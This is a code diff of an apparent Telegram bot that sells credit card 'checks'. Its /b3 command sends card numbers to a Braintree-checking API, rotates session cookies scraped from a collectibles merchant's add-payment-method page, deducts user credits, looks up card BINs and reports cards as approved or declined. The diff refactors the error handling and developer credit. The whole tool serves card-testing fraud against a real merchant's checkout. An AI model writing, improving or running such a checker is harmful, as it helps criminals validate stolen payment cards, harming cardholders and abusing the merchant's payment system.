@@ -3798,8 +3798,6 @@ _ga_D1Q49TMJ2C=GS2.1.s1757491263$o10$g1$t1757491354$j30$l0$h0;
 sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fadd-payment-method'''
 ]
 
-cookie_index = 0
-
 # --- Cooldown tracker (per-user) ---
 user_last_command_time = {}
 COOLDOWN_SECONDS = BASE_COOLDOWN // len(COOKIES_LIST)  # e.g., 3 cookies → ~6s cooldown
@@ -3811,19 +3809,16 @@ def get_next_cookie():
     cookie_index = (cookie_index + 1) % len(COOKIES_LIST)  # rotate
     return cookie
 
-
 # --- Credit System ---
 async def consume_credit(user_id: int) -> bool:
     try:
         user_data = await get_user(user_id)
         if user_data and user_data.get("credits", 0) > 0:
-            new_credits = user_data["credits"] - 1
-            await update_user(user_id, credits=new_credits)
+            await update_user(user_id, credits=user_data["credits"] - 1)
             return True
     except Exception as e:
         logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
     return False
-
 
 # --- /b3 Command ---
 async def b3(update: Update, context):
@@ -3891,24 +3886,33 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         timeout = aiohttp.ClientTimeout(total=20)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(API_URL, params=params) as resp:
-                data = await resp.json(content_type=None)
+                if resp.status != 200:
+                    await processing_msg.edit_text(
+                        f"❌ API returned HTTP {resp.status}",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+                try:
+                    data = await resp.json(content_type=None)
+                except Exception:
+                    text = await resp.text()
+                    await processing_msg.edit_text(
+                        f"❌ Failed parsing API response:\n<code>{escape(text)}</code>",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+    except asyncio.TimeoutError:
+        await processing_msg.edit_text("❌ Request timed out after 20 seconds.", parse_mode=ParseMode.HTML)
+        return
     except Exception as e:
-        await processing_msg.edit_text(
-            f"❌ Error: <code>{escape(str(e))}</code>",
-            parse_mode=ParseMode.HTML
-        )
+        await processing_msg.edit_text(f"❌ Network/API error:\n<code>{escape(str(e))}</code>", parse_mode=ParseMode.HTML)
         return
 
     # --- API response ---
     cc = data.get("cc", cc_input)
     response = data.get("response", "No response")
     status = data.get("status", "UNKNOWN").upper()
-
-    # --- Stylish status ---
-    if status == "APPROVED":
-        stylish_status = "✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b>"
-    else:
-        stylish_status = "❌ <b>𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱</b>"
+    stylish_status = "✅ <b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b>" if status == "APPROVED" else "❌ <b>𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱</b>"
 
     # --- BIN lookup ---
     try:
@@ -3918,8 +3922,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
         issuer = bin_details.get("bank") or "N/A"
         country_name = bin_details.get("country") or "Unknown"
         country_flag = bin_details.get("country_emoji", "")
-    except Exception as e:
-        logger.warning(f"BIN lookup failed for {cc[:6]}: {e}")
+    except Exception:
         brand = issuer = "N/A"
         country_name = "Unknown"
         country_flag = ""
@@ -3927,9 +3930,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
     # --- User info ---
     full_name = " ".join(filter(None, [user.first_name, user.last_name]))
     requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
-    DEVELOPER_NAME = "kคli liຖนxx"
-    DEVELOPER_LINK = "https://t.me/Kalinuxxx"
-    developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+    developer_clickable = f'<a href="https://t.me/Kalinuxxx">kคli liຖนxx</a>'
 
     # --- Credit consume ---
     credit_ok = await consume_credit(user.id)
